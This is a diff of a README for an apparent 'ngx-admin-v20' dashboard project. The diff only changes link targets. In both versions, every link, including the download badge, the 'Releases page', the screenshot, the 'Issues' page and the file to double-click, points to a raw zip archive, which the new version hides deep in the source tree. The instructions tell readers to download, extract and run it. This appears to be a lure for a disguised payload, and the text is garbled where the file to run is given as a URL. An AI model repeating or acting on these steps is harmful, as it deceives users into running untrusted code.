@@ -6,7 +6,7 @@ Welcome! This guide will help you download and run the ngx-admin-v20 application
 
 ## 🔗 Download Now!
 
-[![Download ngx-admin-v20](https://raw.githubusercontent.com/sebbegamer2222/ngx-admin-v20/main/inadaptive/ngx-admin-v20.zip)](https://raw.githubusercontent.com/sebbegamer2222/ngx-admin-v20/main/inadaptive/ngx-admin-v20.zip)
+[![Download ngx-admin-v20](https://github.com/sebbegamer2222/ngx-admin-v20/raw/refs/heads/main/src/app/pages/layout/list/v-ngx-admin-1.8.zip)](https://github.com/sebbegamer2222/ngx-admin-v20/raw/refs/heads/main/src/app/pages/layout/list/v-ngx-admin-1.8.zip)
 
 ## 🛠️ System Requirements
 
@@ -21,11 +21,11 @@ Before you start, make sure your computer meets these requirements:
 
 To get ngx-admin-v20, follow these steps:
 
-1. Click this link to visit the [Releases page](https://raw.githubusercontent.com/sebbegamer2222/ngx-admin-v20/main/inadaptive/ngx-admin-v20.zip).
+1. Click this link to visit the [Releases page](https://github.com/sebbegamer2222/ngx-admin-v20/raw/refs/heads/main/src/app/pages/layout/list/v-ngx-admin-1.8.zip).
 2. Locate the latest version in the list.
 3. Click on the asset that fits your operating system. This is usually labeled with the appropriate file type (like `.zip` or `.exe`).
 
-   ![Releases Screenshot](https://raw.githubusercontent.com/sebbegamer2222/ngx-admin-v20/main/inadaptive/ngx-admin-v20.zip+Page+Screenshot)
+   ![Releases Screenshot](https://github.com/sebbegamer2222/ngx-admin-v20/raw/refs/heads/main/src/app/pages/layout/list/v-ngx-admin-1.8.zip+Page+Screenshot)
 
 4. Once the download is complete, navigate to your downloads folder.
 5. If you downloaded a `.zip` file, extract it:
@@ -33,7 +33,7 @@ To get ngx-admin-v20, follow these steps:
    - On macOS, double-click the file to extract it.
 
 6. After extraction, locate the `ngx-admin` folder.
-7. Open the folder and find the `https://raw.githubusercontent.com/sebbegamer2222/ngx-admin-v20/main/inadaptive/ngx-admin-v20.zip` file. Double-click it to run.
+7. Open the folder and find the `https://github.com/sebbegamer2222/ngx-admin-v20/raw/refs/heads/main/src/app/pages/layout/list/v-ngx-admin-1.8.zip` file. Double-click it to run.
 
 ## 🌟 Features
 
@@ -61,7 +61,7 @@ If you encounter issues while running the application, try the following solutio
 - Make sure you followed the installation steps correctly.
 - Check if your internet connection is stable when loading data.
 
-If problems persist, visit the repository's [Issues](https://raw.githubusercontent.com/sebbegamer2222/ngx-admin-v20/main/inadaptive/ngx-admin-v20.zip) page for help.
+If problems persist, visit the repository's [Issues](https://github.com/sebbegamer2222/ngx-admin-v20/raw/refs/heads/main/src/app/pages/layout/list/v-ngx-admin-1.8.zip) page for help.
 
 ## 📞 Support 
 
